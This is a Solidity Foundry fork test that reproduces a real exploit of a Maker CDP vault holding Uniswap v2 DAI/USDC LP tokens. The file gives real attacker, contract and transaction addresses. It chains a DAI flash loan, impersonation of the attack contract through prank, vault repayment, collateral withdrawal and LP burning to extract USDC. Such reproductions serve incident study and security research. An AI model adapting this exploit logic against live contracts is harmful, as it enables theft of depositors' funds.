// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : ~$151.6K
// Attacker : https://etherscan.io/address/0xdfdea277f6b44270bcb804997d1e6cc4ad8407db
// Attack Contract : https://etherscan.io/address/0xfd51531b26f9be08240f7459eea5be80d5b047d9
// Vulnerable Contract : https://etherscan.io/address/0xae461ca67b15dc8dc81ce7615e0320da1a9ab8d5
// Attack Tx : https://etherscan.io/tx/0xf1818f62c635e5c80ef16b7857da812c74ce330ebed46682b4d173bffe84c666

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xae461ca67b15dc8dc81ce7615e0320da1a9ab8d5#code

// @Analysis
// Post-mortem : https://app.blocksec.com/explorer/tx/eth/0xf1818f62c635e5c80ef16b7857da812c74ce330ebed46682b4d173bffe84c666?line=74
// Twitter Guy : 
// Hacking God : 
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./../interface.sol";

interface IMakerPool {
    function flashLoan(address receiver, address token, uint256 amount, bytes calldata data) external returns (bool);
}

struct Urn {
    uint256 ink;   // Locked Collateral  [wad]
    uint256 art;   // Normalised Debt    [wad]
}

struct Ilk {
        uint256 Art;   // Total Normalised Debt     [wad]
        uint256 rate;  // Accumulated Rates         [ray]
        uint256 spot;  // Price with Safety Margin  [ray]
        uint256 line;  // Debt Ceiling              [rad]
        uint256 dust;  // Urn Debt Floor            [rad]
    }

interface IMakerVat {
    function urns(bytes32, address) external view returns (Urn memory);
    function hope(address) external;
    function heal(uint256) external;
    function ilks(bytes32) external view returns (Ilk memory);
}
interface IMakerManager {
    function urns(uint) external view returns (address);
    function join(address, uint) external;
    function flux(uint, address, uint) external;
    function frob(uint, int, int) external;
    function open(bytes32, address) external returns (uint);
    function cdpAllow(uint, address, uint) external;
}

interface IUniv2 {
    function exit(address, uint256) external;
}

interface IUniv2Token {
    function burn(address) external returns (uint, uint);
}

interface Mcd {
    function sellGem(address, uint256) external;
}

contract Circle is BaseTestWithBalanceLog {
    address private constant maker = 0x1EB4CF3A948E7D72A198fe073cCb8C7a948cD853;
    address private constant susd = 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51;
    address private constant dai = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant usdt = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    address maker_cdp_manager = 0x5ef30b9986345249bc32d8928B7ee64DE9435E39;
    address maker_mcd_join_dai = 0x9759A6Ac90977b93B58547b4A71c78317f391A28;
    address make_mcd_vat = 0x35D1b3F3D7966A1DFe207aa4514C12a259A0492B;
    address univ2 = 0xA81598667AC561986b70ae11bBE2dd5348ed4327;
    address univ2_token = 0xAE461cA67B15dc8dc81CE7615e0320dA1A9aB8D5;
    address mcd = 0x89B78CfA322F6C5dE0aBcEecab66Aee45393cC5A;

    address circle = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    address allower = 0x0A59649758aa4d66E25f08Dd01271e891fe52199;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 15_354_438-1);
    }


    function testExploit() public {
        emit log_named_decimal_uint("[Begin] Attacker Circle before exploit", IERC20(circle).balanceOf(address(this)), 6);
        uint256 amount = 7313820511466897574539490;
        bytes memory data = "0x0000000000000000000000000000000000000000000000000000000000006e970000000000000000000000000000000000000000000000000000000000000000";
        IMakerPool(maker).flashLoan(address(this), dai, amount, data);
        emit log_named_decimal_uint("[End] Attacker Circle after exploit", IERC20(circle).balanceOf(address(this)), 6);
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        address urns_address = IMakerManager(maker_cdp_manager).urns(28311);
        Urn memory urn = IMakerVat(make_mcd_vat).urns(0x554e495632444149555344432d41000000000000000000000000000000000000,urns_address);

        Ilk memory ilk = IMakerVat(make_mcd_vat).ilks(0x554e495632444149555344432d41000000000000000000000000000000000000);

        int dink = 0-int(urn.ink);
        int dart = 0-int(urn.art);
        
        uint256 amount_dai = IERC20(dai).balanceOf(address(this));
        IERC20(dai).approve(maker_mcd_join_dai, amount_dai);

        IMakerManager(maker_mcd_join_dai).join(urns_address, amount_dai);

        cheats.prank(0xfd51531b26f9Be08240f7459Eea5BE80D5B047D9); // borrow the authority of cdp 28311 (assigned before)
        IMakerManager(maker_cdp_manager).frob(28311, dink, dart);
        cheats.prank(0xfd51531b26f9Be08240f7459Eea5BE80D5B047D9);
        IMakerManager(maker_cdp_manager).flux(28311, address(this), urn.ink);
        IUniv2(univ2).exit(address(this), urn.ink);

        IERC20(univ2_token).transfer(univ2_token, urn.ink);
        (uint amount0, uint amount1) = IUniv2Token(univ2_token).burn(address(this));

        IERC20(circle).approve(allower, type(uint256).max);
        Mcd(mcd).sellGem(address(this), 3580348695472);
        IERC20(dai).approve(maker, type(uint256).max);
        return 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9;
    }
}